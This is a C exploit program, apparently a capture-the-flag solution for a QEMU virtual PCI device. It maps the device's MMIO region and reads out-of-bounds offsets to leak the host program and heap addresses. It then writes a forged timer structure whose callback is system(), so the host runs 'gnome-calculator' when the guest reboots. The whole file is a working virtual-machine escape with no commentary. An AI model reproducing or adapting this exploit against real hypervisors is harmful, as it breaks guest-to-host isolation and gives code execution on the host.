#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include<sys/io.h>

unsigned char* mmap_addr;

void mmio_write(uint32_t addr, uint64_t value)
{
    *((uint64_t*)(mmap_addr + addr)) = value;
}

uint64_t mmio_read(uint32_t addr)
{
    return *((uint64_t*)(mmap_addr + addr));
}

int main(int argc, char *argv[])
{
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        perror("open error.");

    mmap_addr = mmap(0, 0x2000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmap_addr == MAP_FAILED)
        perror("mmap error.");

    uint64_t leak_pro = mmio_read(0x1ff0);
    uint64_t pro_base = leak_pro - 0x84DFFD;
    uint64_t system_plt = pro_base + 0x2BC600;
    printf("system addr:%lx\n", system_plt);

    uint64_t leak_heap = mmio_read(0x1f98);
    uint64_t bar_addr = leak_heap-0x1fe0;
    printf("heap addr:%lx\n", leak_heap);
    printf("bar addr:%lx\n", bar_addr);

    uint64_t timer_list = ((leak_heap - 0xe984e0) &0xfffffffffffff000) + 0x148a30;
    uint64_t fake_timer= bar_addr+0xd90;
    mmio_write(0xd90, 0xffffffffffffffff);   //expire_time
    mmio_write(0xd98, timer_list);           //timer_list
    mmio_write(0xda0, system_plt);           //cb
    mmio_write(0xda8, bar_addr+0x200);       //opaque
    mmio_write(0xdb0, 0);                    //next
    mmio_write(0xdb8,0);                     //attributes
    mmio_write(0xdc0,1);                     //scale
    mmio_write(0x100, fake_timer);

    char *shellcode="gnome-calculator";
    uint32_t i;
    for (i=0; i<strlen(shellcode); i++) {
        mmio_write(0x200+i, shellcode[i]);
    }

    system("reboot -n");


}
